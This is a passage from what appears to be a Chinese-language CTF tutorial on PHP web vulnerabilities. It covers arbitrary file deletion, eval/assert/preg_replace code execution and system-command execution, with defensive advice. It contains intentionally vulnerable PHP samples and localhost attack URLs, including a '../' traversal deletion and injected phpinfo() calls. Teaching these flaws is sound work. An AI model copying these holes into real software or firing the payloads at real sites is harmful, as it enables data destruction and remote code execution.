&amp;&amp; $_GET[<span class="string">'action'</span>] == <span class="string">'delete'</span>)&#123;</span><br><span class="line">    $filename = <span class="keyword">isset</span>($_GET[<span class="string">'filename'</span>])?$_GET[<span class="string">'filename'</span>]:<span class="string">''</span>;</span><br><span class="line">    <span class="keyword">if</span>($filename)&#123;</span><br><span class="line">        unlink($basedir.$filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/filedelete.php?action=delete&amp;filename=../../../../../../../test.txt</code></p><h3 id="防范-1"><a href="#防范-1" class="headerlink" title="防范"></a>防范</h3><p>通用防范:</p><ul><li>对权限管理要合理,比如用户A上传的文件,不能被同权限的B用户删除。特殊文件操作需要特权用户才能操作,比如后台删除文件的操作,肯定需要限制管理员才能操作。</li><li>有的文件操作不需要直接传入文件名,比如下载文件时,可以将文件名、路径、ID(MD5形式)及文件上传用户存入数据库中,操作时根据文件ID和当前用户名去判断当前用户有没有权限操作改文件。</li><li>避免目录跳转。禁止<code>..</code>、<code>/</code>、<code>\</code>来跳转目录</li></ul><h2 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h2><p>代码执行漏洞指应用程序本身过滤不严,用户可以通过请求将代码注入到应用中执行。这种漏洞如果没有进行特殊过滤,相当于一个web后门的存在。</p><p>php中导致该漏洞的函数:</p><ul><li>eval</li><li>assert</li><li>preg_replace</li><li>call_user_func</li><li>call_user_func_array</li><li>array_map</li><li>php动态函数($a($b))</li><li>…</li></ul><p>eval()和assert()函数导致的代码执行漏洞大多数是因为载入缓存或者模板以及对变量的处理不严格导致,比如直接把一个外部可控的参数拼接到模板里面，然后调用这两个函数去当成php代码执行。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action_a</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'call action_a method'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">action_b</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'call action_b method'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'m'</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'action_'</span>.$a.<span class="string">'();'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_eval.php?m=b</code></p><p><code>http://127.0.0.1/codexec_eval.php?m=b();phpinfo();//</code></p><p>preg_replace()函数(<strong>php5.5之前可用</strong>)导致代码执行需要存在<code>/e</code>参数，这个函数原本是用来处理字符串的，因此漏洞出现最多的是在对字符串的处理，比如URL、HTML标签及文章内容过滤等地方。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$html_body = <span class="string">'&lt;a &#123;$&#123;phpinfo()&#125;&#125;&gt;&lt;/a&gt;'</span>;</span><br><span class="line">var_dump(preg_replace(<span class="string">"#(&lt;/?)(\w+)([^&gt;]*&gt;)#e"</span>,</span><br><span class="line">              <span class="string">'"\\1".strtoupper("\\2")."\\3"'</span>,$html_body));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_preg.php</code></p><p>由于php特性的原因，php函数可以直接由字符串拼接，导致动态执行函数。</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$_GET[<span class="string">'a'</span>]($_GET[<span class="string">'b'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>http://127.0.0.1/codexec_dynfunc.php?a=assert&amp;b=phpinfo()</code></p><p>还有其他函数，可以自行查阅</p><p>实际环境中可以结合正则表达式使用白名单对参数过滤</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>代码执行是指可以执行代码，命令执行是可以执行系统命令(比如CMD或者BASH命令)。php命令执行是继承webserver用户权限。</p><p>php命令执行函数:</p><ul><li>system</li><li>exec</li><li>shell_exec</li><li>passthru</li><li>pcntl_exec</li><li>popen</li><li>proc_popen</li><li>`</li></ul><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">system(<span class="string">'whoami'</span>);</span><br><span class="line">popen(<span class="string">'whoami &gt;&gt; ./aaa.txt'</span>,<span class="string">'r'</span>);</span><br><span class="line"><span class="keyword">echo</span> `whoami`;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>防范</p><ul><li>使用escapeshellcmd、escapeshellarg防止命令注入</li><li>参数白名单</li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
